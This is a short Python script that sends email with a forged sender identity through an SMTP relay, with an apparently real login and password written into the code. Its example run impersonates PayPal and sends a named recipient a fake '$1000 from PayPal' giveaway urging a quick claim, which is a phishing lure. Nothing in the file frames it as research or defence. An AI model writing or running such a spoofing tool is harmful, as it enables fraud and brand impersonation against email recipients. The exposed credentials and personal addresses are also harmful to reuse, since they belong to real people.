import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import traceback
import configparser

config = configparser.ConfigParser()
config.read('config.ini')

def send_mail(receiver_email, spoofed_email, spoofed_name, message, subject):
    try:
        msg = MIMEMultipart("related")
        msg['From'] = f"{spoofed_name} <{spoofed_email}>" # Use the variables passed as parameters
        msg['To'] = receiver_email
        msg['Subject'] = subject
        body = message
        msg.attach(MIMEText(body, 'plain'))

        # Get SMTP settings from config file
        smtp_host = 'smtp-relay.sendiblue.com'
        smtp_port = 587
        smtp_username = 'michaelkiprono98@gmail.com'
        smtp_password = 'dOJ2X3Sx7yhW5AFw'

        # Connect to SMTP server and send email
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        text = msg.as_string()
        server.sendmail(spoofed_email, receiver_email, text)
        server.quit()
        print('Spoofed Email sent successfully to '+ str(receiver_email) + ' from ' + str(spoofed_name))
    except Exception as e:
        # Print the exception
        print(traceback.format_exc())

# Define variables to be used for sending email
receiver_email = 'mwasimbaemmanuel@gmail.com'
spoofed_email = 'paypal.com'
spoofed_name = 'PayPal'
message = 'You have received a $1000 from PayPal. Please claim soon before 2 days.'
subject = 'PayPal Giveaway'

# Invoke send_mail to send email
send_mail(receiver_email, spoofed_email, spoofed_name, message, subject)